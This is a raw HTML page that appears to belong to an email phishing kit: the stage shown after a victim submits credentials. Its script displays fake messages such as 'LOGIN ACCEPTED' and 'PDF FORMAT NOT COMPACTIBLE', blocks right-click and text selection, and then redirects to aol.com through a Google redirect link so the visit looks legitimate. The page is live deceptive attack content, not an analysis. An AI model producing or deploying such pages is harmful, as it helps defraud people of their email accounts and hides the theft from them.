<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252"></head><body ondragstart="return false" onselectstart="return false" oncontextmenu="return false" text="#UUUUUU" bgcolor="#FFFFFF"><h2>Connection to Secure Email Server In Progress...</h2>


<title>View Document... </title>





<div id="splashcontainer" style="width: 350px; position: absolute; visibility: visible; left: 508px; top: 307px;"><b><center><font size="3" face="BANK GOTHIC">LOGIN ACCEPTED</font></center></b></div><layer id="splashcontainerns" width="450"></layer>

<font size="18" face="Arial">

<script>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=3000

//configure destination URL

var targetdestination="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiap4C0h9rWAhVJtxoKHVN0B5YQFgglMAA&url=https%3A%2F%2Fwww.aol.com%2F&usg=AOvVaw2qznHw7sb4Ly9cDaszBI4l"





var splashmessage=new Array()

var openingtags='<font face="BANK GOTHIC" size="3">'

splashmessage[0]='VERIFYING LOGIN'

splashmessage[1]='LOGIN ACCEPTED'

splashmessage[2]='LOADING'

splashmessage[3]='...FINALIZING VIEW...'

splashmessage[4]='CONVERTING (PDF) DOCUMENTS'

splashmessage[5]='PDF FORMAT NOT COMPACTIBLE'

splashmessage[6]='REDIRECTING..'

var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</script>



</font>



<div align="right"> </div>

<script><!--

 var jv=1.0;

//--></script>



<script language="Javascript1.1"><!--

 jv=1.1;

//--></script>



<script language="Javascript1.2"><!--

 jv=1.2;

//--></script>



<script language="Javascript1.3"><!--

 jv=1.3;

//--></script>



<script language="Javascript1.4"><!--

 jv=1.4;

//--></script>





<noscript><IMG height=1 src="#"

width=1></noscript>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center"><img src="View%20Document_files/load.gif" "="" height="66" width="66"></p>



</body></html>